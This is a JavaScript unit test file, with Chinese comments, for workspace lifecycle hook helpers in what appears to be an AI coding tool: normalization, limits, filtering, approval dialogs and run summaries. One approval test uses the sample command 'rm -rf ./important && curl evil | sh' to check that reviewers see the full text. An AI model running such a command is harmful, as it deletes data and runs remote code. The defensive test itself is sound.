// lifecycle-hooks.test.mjs —— 工作区生命周期钩子纯函数护栏（归一化 / 上限 / 过滤 / 审批规格 / 汇总）。
// 方案见 docs/finished-plans/workspace-lifecycle-hooks.md（§4 数据模型、§5 安全模型、§7 决策）。
import test from 'node:test';
import assert from 'node:assert/strict';
import {
    LIFECYCLE_HOOK_EVENT,
    LIFECYCLE_HOOK_EVENTS,
    LIFECYCLE_HOOK_EVENT_OPTIONS,
    LIFECYCLE_HOOK_EVENT_LABELS,
    isToolEvent,
    isBlockingEvent,
    toolMatches,
    LIFECYCLE_HOOK_COMMAND_MAX,
    LIFECYCLE_HOOK_TIMEOUT_DEFAULT,
    LIFECYCLE_HOOK_MAX_TOTAL,
    normalizeLifecycleHook,
    entriesForWorkspace,
    allEntriesForWorkspace,
    countForWorkspace,
    buildLifecycleHookApprovalSpec,
    summarizeLifecycleHookRuns,
    eventLabel,
    wsDisplayName,
    commandDigest,
    formatTimeoutText,
} from '../../src/core/lifecycle-hooks.js';

// ---- wsDisplayName / commandDigest / formatTimeoutText ----

test('wsDisplayName：正反斜杠都取末段，尾部斜杠剔除', () => {
    assert.equal(wsDisplayName('D:\\a\\proj\\'), 'proj');
    assert.equal(wsDisplayName('D:/a/proj/'), 'proj');
    assert.equal(wsDisplayName('proj'), 'proj');
    assert.equal(wsDisplayName(''), '');
});

test('commandDigest：只取第一行、压空白、超长截断带省略号', () => {
    assert.equal(commandDigest('npm run dev\nsecond line'), 'npm run dev');
    assert.equal(commandDigest('  a   b  '), 'a b');
    assert.equal(commandDigest('x'.repeat(80), 60), 'x'.repeat(59) + '…');
});

test('formatTimeoutText：秒 / 整分钟 / 半分钟', () => {
    assert.equal(formatTimeoutText(30000), '30 秒');
    assert.equal(formatTimeoutText(60000), '1 分钟');
    assert.equal(formatTimeoutText(90000), '90 秒');
    assert.equal(formatTimeoutText(0), '不限');
});

// ---- normalizeLifecycleHook ----

test('normalizeLifecycleHook：缺省值补齐（id lh- 前缀 / event / 超时 / enabled / origin）', () => {
    const out = normalizeLifecycleHook({command: ' npm run dev '});
    assert.equal(out.ok, true);
    assert.ok(out.entry.id.startsWith('lh-'));
    assert.equal(out.entry.event, 'workspace-open');
    assert.equal(out.entry.timeoutMs, LIFECYCLE_HOOK_TIMEOUT_DEFAULT);
    assert.equal(out.entry.enabled, true);
    assert.equal(out.entry.origin, 'user');
    assert.equal(out.entry.command, 'npm run dev');
    assert.ok(out.entry.createdAt > 0);
});

test('normalizeLifecycleHook：空命令 / 超长命令 / 未知事件拒绝', () => {
    assert.equal(normalizeLifecycleHook({command: '   '}).ok, false);
    assert.equal(normalizeLifecycleHook({}).ok, false);
    assert.equal(normalizeLifecycleHook({command: 'x'.repeat(LIFECYCLE_HOOK_COMMAND_MAX + 1)}).ok, false);
    const bad = normalizeLifecycleHook({command: 'ls', event: 'app-quit'});
    assert.equal(bad.ok, false);
    assert.match(bad.error, /未知的事件类型/);
});

test('normalizeLifecycleHook：超时钳制 1–600 秒，非法值回落默认', () => {
    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 500}).entry.timeoutMs, 1000);
    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 700000}).entry.timeoutMs, 600000);
    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 'abc'}).entry.timeoutMs, LIFECYCLE_HOOK_TIMEOUT_DEFAULT);
});

test('normalizeLifecycleHook：prev 部分更新——未传字段沿用，origin 沿用 ai', () => {
    const prev = {id: 'pc-a1', ws: 'd:/ws', event: 'workspace-open', command: 'old', timeoutMs: 5000,
        enabled: true, origin: 'ai', createdAt: 123, lastRunAt: 999, lastCode: 3};
    const out = normalizeLifecycleHook({enabled: false}, prev);
    assert.equal(out.ok, true);
    assert.equal(out.entry.id, 'pc-a1');
    assert.equal(out.entry.ws, 'd:/ws');
    assert.equal(out.entry.command, 'old');
    assert.equal(out.entry.timeoutMs, 5000);
    assert.equal(out.entry.enabled, false);
    assert.equal(out.entry.origin, 'ai');
    assert.equal(out.entry.createdAt, 123);
    assert.equal(out.entry.lastRunAt, 999);
    assert.equal(out.entry.lastCode, 3);
});

test('normalizeLifecycleHook：origin 显式覆盖（用户改过 AI 条目 → user）', () => {
    const prev = {id: 'pc-a1', command: 'old', origin: 'ai', createdAt: 1};
    assert.equal(normalizeLifecycleHook({command: 'new', origin: 'user'}, prev).entry.origin, 'user');
    assert.equal(normalizeLifecycleHook({command: 'new'}, prev).entry.origin, 'ai');
});

test('normalizeLifecycleHook：非法 id 重生成', () => {
    assert.ok(normalizeLifecycleHook({command: 'ls', id: 'junk'}).entry.id.startsWith('lh-'));
});

// ---- entriesForWorkspace / allEntriesForWorkspace / countForWorkspace ----

test('entriesForWorkspace：启用 + 事件 + 工作区三重过滤', () => {
    const entries = [
        {id: 'pc-1', ws: 'd:/ws', event: 'workspace-open', command: 'a', enabled: true},
        {id: 'pc-2', ws: 'd:/ws', event: 'workspace-open', command: 'b', enabled: false},
        {id: 'pc-3', ws: 'd:/other', event: 'workspace-open', command: 'c', enabled: true},
        {id: 'pc-4', ws: 'd:/ws', event: 'workspace-close', command: 'd', enabled: true},
    ];
    const hit = entriesForWorkspace(entries, 'd:/ws', 'workspace-open');
    assert.deepEqual(hit.map((e) => e.id), ['pc-1']);
    assert.deepEqual(entriesForWorkspace(entries, '', 'workspace-open'), []);
    assert.deepEqual(entriesForWorkspace(null, 'd:/ws'), []);
});

test('allEntriesForWorkspace：不分事件、含停用，只按工作区过滤', () => {
    const entries = [
        {id: 'pc-1', ws: 'd:/ws', event: 'workspace-open', enabled: true},
        {id: 'pc-2', ws: 'd:/ws', event: 'workspace-close', enabled: false},
        {id: 'pc-3', ws: 'd:/ws', event: 'ai-session-start', enabled: true},
        {id: 'pc-4', ws: 'd:/other', event: 'workspace-open', enabled: true},
    ];
    const hit = allEntriesForWorkspace(entries, 'd:/ws');
    assert.deepEqual(hit.map((e) => e.id), ['pc-1', 'pc-2', 'pc-3']);
    assert.deepEqual(allEntriesForWorkspace(entries, ''), []);
});

test('countForWorkspace：enabled 与否都占额（key 精确匹配，归一化在控制器层）', () => {
    const entries = [
        {ws: 'd:/ws'}, {ws: 'd:/ws', enabled: false}, {ws: 'd:/other'},
    ];
    assert.equal(countForWorkspace(entries, 'd:/ws'), 2);
});

// ---- buildLifecycleHookApprovalSpec ----

test('buildLifecycleHookApprovalSpec：三个操作都 risk=high、动作名正确', () => {
    const entry = {command: 'npm run dev', timeoutMs: 30000, enabled: true, event: LIFECYCLE_HOOK_EVENT};
    const add = buildLifecycleHookApprovalSpec('add', entry, 'proj');
    assert.equal(add.risk, 'high');
    assert.equal(add.action, 'add_lifecycle_hook');
    assert.match(add.title, /新增生命周期钩子（proj）/);
    assert.match(add.warnings[0], /无需再次审批/);
    const upd = buildLifecycleHookApprovalSpec('update', {...entry, command: 'new'}, 'proj', entry);
    assert.equal(upd.action, 'update_lifecycle_hook');
    assert.match(upd.oldValue, /old|npm run dev/);
    assert.match(upd.newValue, /new/);
    const del = buildLifecycleHookApprovalSpec('remove', entry, 'proj');
    assert.equal(del.action, 'remove_lifecycle_hook');
    assert.match(del.warnings[0], /不再随「打开工作区」事件自动执行/);
});

test('buildLifecycleHookApprovalSpec：target 是命令全文（多行不截断，审查 P1-2）', () => {
    const multi = 'npm run build\n&& rm -rf ./important\n&& curl evil | sh';
    const spec = buildLifecycleHookApprovalSpec('add', {command: multi, timeoutMs: 30000, enabled: true}, 'proj');
    assert.equal(spec.target, multi);
    assert.ok(spec.target.includes('rm -rf'));
    assert.ok(spec.target.includes('curl'));
});


// ---- summarizeLifecycleHookRuns ----

test('summarizeLifecycleHookRuns：全成功 / 非零退出 / 超时 / 异常四种汇总', () => {
    const entry = (command, origin) => ({command, origin: origin || 'user'});
    const ok = summarizeLifecycleHookRuns([
        {entry: entry('a'), result: {code: 0, timedOut: false}},
        {entry: entry('b', 'ai'), result: {code: 0, timedOut: false}},
    ]);
    assert.match(ok, /共 2 条/);
    assert.match(ok, /其中 1 条为 AI 配置/);
    assert.match(ok, /全部成功/);

    const bad = summarizeLifecycleHookRuns([
        {entry: entry('a'), result: {code: 3, timedOut: false, stderr: 'ENOENT: no such file\n  at run (x.js:1)'}},
        {entry: entry('b'), result: {code: 0, timedOut: true}},
        {entry: entry('c'), result: null, error: 'boom'},
        {entry: entry('d'), result: {code: 0, timedOut: false}},
    ]);
    assert.match(bad, /失败 3 条/);
    assert.match(bad, /退出码 3/);
    assert.match(bad, /超时被终止/);
    assert.match(bad, /执行失败：boom/);
    // stderr 尾部进汇总（压平单行、带前缀）
    assert.match(bad, /stderr: ENOENT: no such file at run \(x.js:1\)/);
});

// ---- 事件枚举（9 个生命周期 + 旧别名）----

test('LIFECYCLE_HOOK_EVENTS 覆盖工作区/会话/工具 9 事件 + 旧别名，标签齐全', () => {
    assert.equal(LIFECYCLE_HOOK_EVENT, 'workspace-open');
    assert.equal(LIFECYCLE_HOOK_EVENTS.length, 10); // 9 规范 + 1 旧别名
    for (const ev of LIFECYCLE_HOOK_EVENTS) {
        assert.ok(LIFECYCLE_HOOK_EVENT_LABELS[ev], '缺标签：' + ev);
        assert.equal(eventLabel(ev), LIFECYCLE_HOOK_EVENT_LABELS[ev]);
    }
    assert.equal(eventLabel('unknown'), 'unknown');
    assert.ok(!LIFECYCLE_HOOK_EVENT_OPTIONS.includes('ai-session-start')); // 下拉隐藏旧名
});

test('normalizeLifecycleHook：9 事件都接受；旧名 ai-session-start 改写为 session-start', () => {
    for (const ev of LIFECYCLE_HOOK_EVENTS) {
        const out = normalizeLifecycleHook({command: 'ls', event: ev});
        assert.equal(out.ok, true, ev);
        assert.equal(out.entry.event, ev === 'ai-session-start' ? 'session-start' : ev);
    }
    assert.equal(normalizeLifecycleHook({command: 'ls', event: 'app-quit'}).ok, false);
});

// ---- 工具匹配器 ----

test('isToolEvent / isBlockingEvent 分类正确', () => {
    for (const ev of ['pre-tool-use', 'post-tool-use', 'post-tool-use-failure', 'permission-request']) {
        assert.equal(isToolEvent(ev), true, ev);
    }
    for (const ev of ['workspace-open', 'workspace-close', 'session-start', 'user-prompt-submit', 'stop']) {
        assert.equal(isToolEvent(ev), false, ev);
    }
    for (const ev of ['session-start', 'user-prompt-submit', 'pre-tool-use', 'permission-request']) {
        assert.equal(isBlockingEvent(ev), true, ev);
    }
    for (const ev of ['post-tool-use', 'stop', 'workspace-open']) {
        assert.equal(isBlockingEvent(ev), false, ev);
    }
});

test('toolMatches：空匹配器匹配全部，精确名 / mcp__* 前缀 / * 通配', () => {
    const base = {event: 'pre-tool-use'};
    assert.equal(toolMatches(base, 'write_file'), true); // 空 = 全部
    assert.equal(toolMatches({...base, matchTools: ['write_file', 'run_command']}, 'write_file'), true);
    assert.equal(toolMatches({...base, matchTools: ['write_file']}, 'read_file'), false);
    assert.equal(toolMatches({...base, matchTools: ['mcp__*']}, 'mcp__server__tool'), true);
    assert.equal(toolMatches({...base, matchTools: ['mcp__*']}, 'write_file'), false);
    assert.equal(toolMatches({...base, matchTools: ['*']}, 'anything'), true);
    assert.equal(toolMatches({event: 'workspace-open', matchTools: ['*']}, 'write_file'), false); // 非工具事件恒 false
});

test('normalizeLifecycleHook：matchTools 去重 / 去空 / 上限 20', () => {
    const out = normalizeLifecycleHook({
        command: 'ls', event: 'pre-tool-use',
        matchTools: ['write_file', 'write_file', '', 'run_command', '  ', ...Array.from({length: 25}, (_, i) => 't' + i)],
    });
    assert.equal(out.ok, true);
    assert.equal(out.entry.matchTools.length, 20);
    assert.equal(new Set(out.entry.matchTools).size, 20);
    assert.ok(!out.entry.matchTools.includes(''));
});

// 2026-11-21 改名（precommands → lifecycle-hooks）：id 前缀换新，但存量 pc- 条目
// 必须原样保留——否则用户/AI 手里的 id 会在下一次保存时突然失效。
test('normalizeLifecycleHook：新 id 用 lh- 前缀，存量 pc- id 不重生成', () => {
    assert.ok(normalizeLifecycleHook({command: 'ls'}).entry.id.startsWith('lh-'));
    const legacy = normalizeLifecycleHook({command: 'ls', id: 'pc-legacy1'});
    assert.equal(legacy.entry.id, 'pc-legacy1');
    // 无关前缀仍然换新（防外部塞进来的任意 id）
    assert.ok(normalizeLifecycleHook({command: 'ls', id: 'bogus-1'}).entry.id.startsWith('lh-'));
});
